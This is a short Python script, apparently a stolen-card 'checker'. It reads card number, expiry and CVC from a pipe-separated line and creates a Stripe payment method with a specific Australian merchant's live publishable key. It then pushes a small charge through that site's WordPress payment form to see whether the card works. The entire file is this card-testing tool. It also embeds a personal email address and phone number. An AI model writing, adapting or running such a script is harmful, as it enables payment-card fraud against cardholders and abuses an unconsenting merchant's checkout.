import requests

def Tele(ccx):
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    if "20" in yy:  # Adjust the year format if needed
        yy = yy.split("20")[1]
    r = requests.session()

    headers = {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }

    data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=NA&muid=NA&sid=NA&payment_user_agent=stripe.js%2Fee4145ae1a%3B+stripe-js-v3%2Fee4145ae1a%3B+card-element&referrer=https%3A%2F%2Fshiftmelbourne.com.au&time_on_page=119447&key=pk_live_51LQKRjFLsb4c8hsgKFzuawTi9IXJtUFP7FuCSkRjj75Ay9C57NvLWIHpY0R4lz2hFo9tFplW1QqJlPkXOz5z4nz000haJJUHLu&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...'

    r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)

    pm = r1.json()['id']

    headers = {
        'authority': 'shiftmelbourne.com.au',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9,my;q=0.8',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://shiftmelbourne.com.au',
        'referer': 'https://shiftmelbourne.com.au/make-a-payment/',
        'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
        'x-requested-with': 'XMLHttpRequest',
    }

    params = {
        't': '1729457705787',
    }

    data = {
        'data': '__fluent_form_embded_post_id=8&_fluentform_3_fluentformnonce=0618ac1890&_wp_http_referer=%2Fmake-a-payment%2F&names%5Bfirst_name%5D=waznim&names%5Blast_name%5D=ey&email=waznimey%40gmail.com&phone=%2B959976246250&input_text=Make&input_text_1=J&input_text_2=Vechical&custom-payment-amount=1&payment_method=stripe&terms-n-condition=on&__stripe_payment_method_id=' + str(pm) + ' ',
        'action': 'fluentform_submit',
        'form_id': '3',
    }

    r2 = requests.post('https://shiftmelbourne.com.au/wp-admin/admin-ajax.php', params=params, headers=headers, data=data)

    return r2.json()